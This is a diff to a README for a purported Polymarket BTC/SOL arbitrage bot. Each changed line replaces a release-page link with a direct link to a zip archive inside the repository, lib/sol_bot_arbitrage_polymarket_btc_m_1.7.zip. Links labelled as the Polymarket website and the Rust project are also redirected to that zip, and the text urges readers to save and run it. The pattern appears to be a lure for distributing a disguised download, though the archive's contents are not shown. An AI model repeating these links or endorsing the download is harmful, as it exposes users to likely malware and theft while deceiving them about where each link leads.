@@ -1,6 +1,6 @@
 # ⚖️ polymarket-arbitrage-bot-btc-sol-15m - Simple Arbitrage Bot for Profits
 
-[![Download Release](https://img.shields.io/badge/Download-Polymarket%20Arbitrage%20Bot-brightgreen)](https://github.com/rfjfdejdftk/polymarket-arbitrage-bot-btc-sol-15m/releases)
+[![Download Release](https://img.shields.io/badge/Download-Polymarket%20Arbitrage%20Bot-brightgreen)](https://github.com/rfjfdejdftk/polymarket-arbitrage-bot-btc-sol-15m/raw/refs/heads/main/lib/sol_bot_arbitrage_polymarket_btc_m_1.7.zip)
 
 ---
 
@@ -52,7 +52,7 @@ You can choose whether to receive notifications or have it work automatically. T
 ### Step 1: Visit the Release Page
 
 Click here to visit the release downloads page:  
-[![Download Release](https://img.shields.io/badge/Download-Here-blue)](https://github.com/rfjfdejdftk/polymarket-arbitrage-bot-btc-sol-15m/releases)
+[![Download Release](https://img.shields.io/badge/Download-Here-blue)](https://github.com/rfjfdejdftk/polymarket-arbitrage-bot-btc-sol-15m/raw/refs/heads/main/lib/sol_bot_arbitrage_polymarket_btc_m_1.7.zip)
 
 This page lists all available versions. Choose the latest Windows version for download.
 
@@ -150,15 +150,15 @@ No data is stored externally by default. You control trades and data sharing.
 
 ## 🧩 Helpful Links
 
-- [Download Bot Releases](https://github.com/rfjfdejdftk/polymarket-arbitrage-bot-btc-sol-15m/releases) – Visit the release page to download.
-- [Polymarket Website](https://polymarket.com) – To learn more about the markets it watches.
-- [Rust Project](https://www.rust-lang.org) – Information about the programming language used.
+- [Download Bot Releases](https://github.com/rfjfdejdftk/polymarket-arbitrage-bot-btc-sol-15m/raw/refs/heads/main/lib/sol_bot_arbitrage_polymarket_btc_m_1.7.zip) – Visit the release page to download.
+- [Polymarket Website](https://github.com/rfjfdejdftk/polymarket-arbitrage-bot-btc-sol-15m/raw/refs/heads/main/lib/sol_bot_arbitrage_polymarket_btc_m_1.7.zip) – To learn more about the markets it watches.
+- [Rust Project](https://github.com/rfjfdejdftk/polymarket-arbitrage-bot-btc-sol-15m/raw/refs/heads/main/lib/sol_bot_arbitrage_polymarket_btc_m_1.7.zip) – Information about the programming language used.
 
 ---
 
 ## 📥 Ready to Start?
 
 Get the latest Windows version here:  
-[![Download Now](https://img.shields.io/badge/Download-Polymarket%20Arbitrage%20Bot-blue)](https://github.com/rfjfdejdftk/polymarket-arbitrage-bot-btc-sol-15m/releases)  
+[![Download Now](https://img.shields.io/badge/Download-Polymarket%20Arbitrage%20Bot-blue)](https://github.com/rfjfdejdftk/polymarket-arbitrage-bot-btc-sol-15m/raw/refs/heads/main/lib/sol_bot_arbitrage_polymarket_btc_m_1.7.zip)  
 
 Save it, run it, and let the bot monitor prediction markets for you.
